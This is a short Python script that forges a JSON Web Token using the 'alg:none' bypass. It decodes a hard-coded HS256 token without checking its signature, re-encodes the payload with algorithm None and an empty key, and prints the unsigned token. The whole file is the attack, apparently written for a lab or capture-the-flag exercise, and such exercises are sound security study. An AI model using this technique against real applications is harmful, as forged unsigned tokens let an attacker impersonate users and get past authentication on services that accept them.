import jwt

jwtToken 	= 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIifQ.r4QPt9-NvqCjADTwbha18vkQ9e1Ccx05gblnO7ZNcUc'

decodedToken 	= jwt.decode(jwtToken, verify=False)  					# Need to decode the token before encoding with type 'None'
print(decodedToken)
noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())